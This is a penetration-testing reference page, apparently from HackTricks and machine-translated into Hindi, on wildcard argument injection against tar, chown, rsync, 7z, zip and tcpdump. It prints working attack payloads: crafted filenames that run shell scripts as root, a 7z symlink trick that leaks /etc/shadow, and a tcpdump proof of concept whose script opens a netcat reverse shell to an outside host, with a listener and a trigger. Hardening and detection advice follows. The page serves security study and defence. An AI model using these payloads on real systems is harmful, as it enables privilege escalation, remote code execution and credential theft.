# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** तब होती है जब एक विशेषाधिकार प्राप्त स्क्रिप्ट एक Unix बाइनरी जैसे `tar`, `chown`, `rsync`, `zip`, `7z`, … को एक अनकोटेड वाइल्डकार्ड जैसे `*` के साथ चलाती है।  
> चूंकि शेल वाइल्डकार्ड को बाइनरी को निष्पादित करने से **पहले** विस्तारित करता है, एक हमलावर जो कार्यशील निर्देशिका में फ़ाइलें बना सकता है, वह फ़ाइल नाम तैयार कर सकता है जो `-` से शुरू होते हैं ताकि उन्हें **डेटा के बजाय विकल्पों के रूप में** व्याख्यायित किया जा सके, प्रभावी रूप से मनमाने ध्वजों या यहां तक कि आदेशों को तस्करी करने में सक्षम हो।  
> यह पृष्ठ 2023-2025 के लिए सबसे उपयोगी प्राइमिटिव, हाल के शोध और आधुनिक पहचान को एकत्र करता है।

## chown / chmod

आप `--reference` ध्वज का दुरुपयोग करके **किसी भी फ़ाइल के मालिक/समूह या अनुमति बिट्स की कॉपी कर सकते हैं**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
जब रूट बाद में कुछ ऐसा निष्पादित करता है:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` इंजेक्ट किया गया है, जिससे *सभी* मेल खाने वाले फ़ाइलें `/root/secret``file` के स्वामित्व/अनुमतियों को विरासत में लेती हैं।

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (संयुक्त हमला)।
विवरण के लिए क्लासिक DefenseCode पेपर भी देखें।

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** फ़ीचर का दुरुपयोग करके मनमाने कमांड निष्पादित करें:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
एक बार जब रूट चलाता है जैसे `tar -czf /root/backup.tgz *`, `shell.sh` रूट के रूप में निष्पादित होता है।

### bsdtar / macOS 14+

हाल के macOS पर डिफ़ॉल्ट `tar` (जो `libarchive` पर आधारित है) `--checkpoint` को लागू नहीं करता है, लेकिन आप **--use-compress-program** ध्वज के साथ कोड-निष्पादन प्राप्त कर सकते हैं जो आपको एक बाहरी संकुचनकर्ता निर्दिष्ट करने की अनुमति देता है।
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
जब एक विशेषाधिकार प्राप्त स्क्रिप्ट `tar -cf backup.tar *` चलाती है, तो `/bin/sh` शुरू होगा।

---

## rsync

`rsync` आपको कमांड-लाइन फ्लैग के माध्यम से रिमोट शेल या यहां तक कि रिमोट बाइनरी को ओवरराइड करने की अनुमति देता है जो `-e` या `--rsync-path` से शुरू होते हैं:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
यदि रूट बाद में `rsync -az * backup:/srv/` के साथ निर्देशिका को संग्रहित करता है, तो इंजेक्ट किया गया ध्वज आपके शेल को दूरस्थ पक्ष पर उत्पन्न करता है।

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` मोड)।

---

## 7-Zip / 7z / 7za

यहां तक कि जब विशेषाधिकार प्राप्त स्क्रिप्ट *रक्षात्मक रूप से* वाइल्डकार्ड को `--` के साथ पूर्ववर्ती करती है (विकल्प पार्सिंग को रोकने के लिए), 7-Zip प्रारूप **फाइल सूची फ़ाइलों** का समर्थन करता है, फ़ाइल नाम को `@` के साथ पूर्ववर्ती करके। इसे एक सिम्लिंक के साथ मिलाकर आपको *मनमाने फ़ाइलों को एक्सफिल्ट्रेट* करने की अनुमति मिलती है:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
यदि रूट कुछ इस तरह निष्पादित करता है:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip `root.txt` (→ `/etc/shadow`) को फ़ाइल सूची के रूप में पढ़ने का प्रयास करेगा और बाहर निकल जाएगा, **stderr पर सामग्री प्रिंट करते हुए**।

---

## zip

`zip` ध्वज `--unzip-command` का समर्थन करता है जो *शब्दशः* सिस्टम शेल को पास किया जाता है जब संग्रह का परीक्षण किया जाएगा:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject करें फ्लैग को एक तैयार की गई फ़ाइल नाम के माध्यम से और प्रतीक्षा करें कि विशेषाधिकार प्राप्त बैकअप स्क्रिप्ट `zip -T` (परीक्षण संग्रह) को परिणामस्वरूप फ़ाइल पर कॉल करे।

---

## अतिरिक्त बाइनरी जो वाइल्डकार्ड इंजेक्शन के प्रति संवेदनशील हैं (2023-2025 त्वरित सूची)

निम्नलिखित कमांड्स को आधुनिक CTFs और वास्तविक वातावरण में दुरुपयोग किया गया है। पेलोड हमेशा एक *फाइल नाम* के रूप में बनाया जाता है जो एक लिखने योग्य निर्देशिका के अंदर होता है जिसे बाद में वाइल्डकार्ड के साथ संसाधित किया जाएगा:

| बाइनरी | दुरुपयोग करने के लिए फ्लैग | प्रभाव |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → मनमाना `@file` | फ़ाइल सामग्री पढ़ें |
| `flock` | `-c <cmd>` | कमांड निष्पादित करें |
| `git`   | `-c core.sshCommand=<cmd>` | SSH के माध्यम से git के जरिए कमांड निष्पादन |
| `scp`   | `-S <cmd>` | ssh के बजाय मनमाना प्रोग्राम उत्पन्न करें |

ये प्राइमिटिव *tar/rsync/zip* क्लासिक्स की तुलना में कम सामान्य हैं लेकिन शिकार करते समय जांचने लायक हैं।

---

## tcpdump रोटेशन हुक (-G/-W/-z): argv इंजेक्शन के माध्यम से RCE

जब एक प्रतिबंधित शेल या विक्रेता रैपर उपयोगकर्ता-नियंत्रित फ़ील्ड (जैसे, "फाइल नाम" पैरामीटर) को बिना सख्त उद्धरण/मान्यता के जोड़कर `tcpdump` कमांड लाइन बनाता है, तो आप अतिरिक्त `tcpdump` फ्लैग्स को चुराने में सक्षम होते हैं। `-G` (समय-आधारित रोटेशन), `-W` (फाइलों की संख्या सीमित करें), और `-z <cmd>` (पोस्ट-रोटेट कमांड) का संयोजन मनमाने कमांड निष्पादन का परिणाम देता है जैसे कि उपयोगकर्ता tcpdump चला रहा है (अक्सर उपकरणों पर root)।

पूर्व शर्तें:

- आप `tcpdump` को पास किए गए `argv` को प्रभावित कर सकते हैं (जैसे, `/debug/tcpdump --filter=... --file-name=<HERE>` के माध्यम से)।
- रैपर फ़ाइल नाम क्षेत्र में स्पेस या `-`-पूर्वकृत टोकन को साफ नहीं करता है।

क्लासिक PoC (एक लिखने योग्य पथ से एक रिवर्स शेल स्क्रिप्ट निष्पादित करता है):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` पहले मिलान वाले पैकेट के बाद तुरंत घुमाने के लिए मजबूर करता है।
- `-z <cmd>` हर घुमाव पर पोस्ट-घुमाव कमांड चलाता है। कई बिल्ड `<cmd> <savefile>` निष्पादित करते हैं। यदि `<cmd>` एक स्क्रिप्ट/इंटरप्रेटर है, तो सुनिश्चित करें कि तर्क प्रबंधन आपके पेलोड से मेल खाता है।

No-removable-media variants:

- यदि आपके पास फ़ाइलें लिखने के लिए कोई अन्य प्राइमिटिव है (जैसे, एक अलग कमांड रैपर जो आउटपुट रीडायरेक्शन की अनुमति देता है), तो अपनी स्क्रिप्ट को एक ज्ञात पथ में डालें और `-z /bin/sh /path/script.sh` या `-z /path/script.sh` को प्लेटफ़ॉर्म अर्थशास्त्र के अनुसार ट्रिगर करें।
- कुछ विक्रेता रैपर हमलावर-नियंत्रित स्थानों पर घुमाते हैं। यदि आप घुमाए गए पथ को प्रभावित कर सकते हैं (सिंबलिंक/डायरेक्टरी ट्रैवर्सल), तो आप `-z` को ऐसा सामग्री निष्पादित करने के लिए निर्देशित कर सकते हैं जिसे आप पूरी तरह से नियंत्रित करते हैं बिना बाहरी मीडिया के।

Hardening tips for vendors:

- कभी भी उपयोगकर्ता-नियंत्रित स्ट्रिंग्स को सीधे `tcpdump` (या किसी भी उपकरण) को सख्त अनुमति सूचियों के बिना न दें। उद्धरण और मान्य करें।
- रैपर में `-z` कार्यक्षमता को उजागर न करें; tcpdump को एक निश्चित सुरक्षित टेम्पलेट के साथ चलाएं और अतिरिक्त ध्वजों को पूरी तरह से अस्वीकार करें।
- tcpdump विशेषाधिकारों को छोड़ें (cap_net_admin/cap_net_raw केवल) या एक समर्पित अप्रिविलेज्ड उपयोगकर्ता के तहत AppArmor/SELinux संकुचन के साथ चलाएं।

## Detection & Hardening

1. **महत्वपूर्ण स्क्रिप्ट में शेल ग्लोबिंग को निष्क्रिय करें**: `set -f` (`set -o noglob`) वाइल्डकार्ड विस्तार को रोकता है।
2. **तर्कों को उद्धृत या एस्केप करें**: `tar -czf "$dst" -- *` *सुरक्षित* नहीं है — `find . -type f -print0 | xargs -0 tar -czf "$dst"` को प्राथमिकता दें।
3. **स्पष्ट पथ**: `/var/www/html/*.log` का उपयोग करें `*` के बजाय ताकि हमलावर ऐसे भाई-फाइलें न बना सकें जो `-` से शुरू होती हैं।
4. **कम से कम विशेषाधिकार**: बैकअप/रखरखाव कार्यों को संभव हो तो रूट के बजाय एक अप्रिविलेज्ड सेवा खाते के रूप में चलाएं।
5. **निगरानी**: Elastic का पूर्व-निर्मित नियम *Potential Shell via Wildcard Injection* `tar --checkpoint=*`, `rsync -e*`, या `zip --unzip-command` के तुरंत बाद एक शेल चाइल्ड प्रोसेस की तलाश करता है। EQL क्वेरी को अन्य EDRs के लिए अनुकूलित किया जा सकता है।

---

## References

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
